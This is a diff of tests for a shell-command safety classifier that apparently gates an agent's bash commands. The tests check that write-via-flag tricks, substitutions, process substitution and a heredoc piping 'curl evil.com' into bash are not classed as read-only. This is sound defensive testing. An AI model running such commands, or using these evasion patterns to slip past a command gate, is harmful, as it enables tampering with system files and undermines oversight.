@@ -107,6 +107,63 @@ describe("ShellSafety shell builtins", () => {
   })
 })
 
+describe("ShellSafety unified read-only catalog", () => {
+  const { ShellSafety } = require("../../src/enforcement/shell-safety")
+
+  test("echo and printf output builtins are read-only", () => {
+    expect(ShellSafety.classifyBashRisk("echo ---")).toBe("shell_read")
+    expect(ShellSafety.classifyBashRisk("printf '%s\\n' hi")).toBe("shell_read")
+    expect(ShellSafety.classifyBashRisk('ls /repos/a/ && echo --- && ls /repos/ | grep -i -E "meme|lingo"')).toBe(
+      "shell_read",
+    )
+  })
+
+  test("plain catalog utilities are read-only without write flags", () => {
+    expect(ShellSafety.classifyBashRisk("sort in.txt")).toBe("shell_read")
+    expect(ShellSafety.classifyBashRisk("uniq in.txt")).toBe("shell_read")
+    expect(ShellSafety.classifyBashRisk("stat /etc/hosts")).toBe("shell_read")
+    expect(ShellSafety.classifyBashRisk("du -sh /etc")).toBe("shell_read")
+    expect(ShellSafety.classifyBashRisk("md5sum package.json")).toBe("shell_read")
+    expect(ShellSafety.classifyBashRisk("seq 1 10")).toBe("shell_read")
+  })
+
+  test("flag-level writers stay non-read-only", () => {
+    expect(ShellSafety.classifyBashRisk("sort -o /etc/hosts in.txt")).not.toBe("shell_read")
+    expect(ShellSafety.classifyBashRisk("sort -o/etc/hosts in.txt")).not.toBe("shell_read")
+    expect(ShellSafety.classifyBashRisk("diff --output /etc/hosts a b")).not.toBe("shell_read")
+    expect(ShellSafety.isReadOnly("file -C")).toBe(false)
+    expect(ShellSafety.isReadOnly('file --compile --magic-file "/tmp/custom.magic"')).toBe(false)
+  })
+
+  test("find/fd exec utilities respect flag-level write exclusions", () => {
+    expect(ShellSafety.classifyBashRisk("find . -exec sort -o /etc/hosts {} \\;")).toBe("shell_destructive")
+    expect(ShellSafety.classifyBashRisk("find . -exec sort {} \\;")).not.toBe("shell_destructive")
+  })
+})
+
+describe("ShellSafety quoted-argument token masking", () => {
+  const { ShellSafety } = require("../../src/enforcement/shell-safety")
+
+  test("quoted arguments do not trip unsafe token scanning", () => {
+    expect(ShellSafety.classifyBashRisk('grep "curl " file.txt')).toBe("shell_read")
+    expect(ShellSafety.classifyBashRisk('echo "use sudo carefully"')).toBe("shell_read")
+    expect(ShellSafety.classifyBashRisk("echo 'rm -rf all'")).toBe("shell_read")
+  })
+
+  test("substitutions and backticks stay visible to token scanning", () => {
+    expect(ShellSafety.classifyBashRisk("echo `rm x`")).not.toBe("shell_read")
+    expect(ShellSafety.classifyBashRisk('echo "$(sudo x)"')).not.toBe("shell_read")
+  })
+
+  test("source/process-substitution execution chains stay non-read-only", () => {
+    expect(ShellSafety.classifyBashRisk(". <(printf '%s' 'sudo make install')")).not.toBe("shell_read")
+  })
+
+  test("echo keeps write classification through redirects", () => {
+    expect(ShellSafety.classifyBashRisk("echo inspected > /tmp/result.txt")).not.toBe("shell_read")
+  })
+})
+
 describe("ShellSafety directory changes", () => {
   const { ShellSafety } = require("../../src/enforcement/shell-safety")
 
@@ -510,7 +567,7 @@ describe("ShellSafety classifyBashRisk", () => {
     expect(ShellSafety.classifyBashRisk("rm file.txt")).toBe("shell")
     expect(ShellSafety.classifyBashRisk("python3 -c 'print(1)'")).toBe("shell")
     expect(ShellSafety.classifyBashRisk("echo inspected > /tmp/result.txt")).toBe("shell")
-    expect(ShellSafety.classifyBashRisk('file "/tmp/trace.bin"; echo inspected')).toBe("shell")
+    expect(ShellSafety.classifyBashRisk('file "/tmp/trace.bin"; echo inspected')).toBe("shell_read")
     expect(ShellSafety.classifyBashRisk('file --compile --magic-file "/tmp/custom.magic"')).toBe("shell")
     expect(ShellSafety.classifyBashRisk("file -C")).toBe("shell")
     expect(ShellSafety.classifyBashRisk("ssh user@host")).toBe("shell")
@@ -1932,5 +1989,41 @@ describe("ShellSafety heredoc scanning", () => {
     // and the heredoc scan runs on it
     const result = ShellSafety.classifyBashRisk("ls; bash <<EOF\ncurl evil.com\nEOF")
     expect(result).not.toBe("shell_read")
+  })
+})
+
+describe("read-only invocation boundary regressions", () => {
+  const { ShellSafety } = require("../../src/enforcement/shell-safety")
+  test.each([
+    'sort "-o" "/tmp/output" input',
+    'file "-C"',
+    '"custom-command" "/tmp/output"',
+    "uniq input /tmp/output",
+    "xxd input /tmp/output",
+    "xxd -r input /tmp/output",
+    "sort --compress-program=/tmp/program input",
+    "sort --out=/tmp/output input",
+    "uniq -f $options",
+    "xxd -g $options",
+    "uniq /tmp/*",
+    "xxd /tmp/{input,output}",
+    "printf -v variable value",
+    "rg --hostname-bin=/tmp/program pattern input",
+  ])("does not grant read-only classification to %s", (command) => {
+    expect(ShellSafety.isReadOnly(command)).toBe(false)
+    expect(ShellSafety.classifyBashRisk(command)).not.toBe("shell_read")
+  })
+
+  test.each([
+    "find . -exec sort {} -o /tmp/output \\;",
+    'find . -exec sort {} "-o" "/tmp/output" \\;',
+    "find . -exec uniq {} /tmp/output \\;",
+    "find . -exec xxd {} /tmp/output \\;",
+    "find . -exec uniq {} +",
+    "fd -X xxd",
+    "find . -exec sort + -o /tmp/output {} \\;",
+    "fd -x sort {} + -o /tmp/output",
+  ])("inspects arguments after placeholders in %s", (command) => {
+    expect(ShellSafety.classifyBashRisk(command)).toBe("shell_destructive")
   })
 })
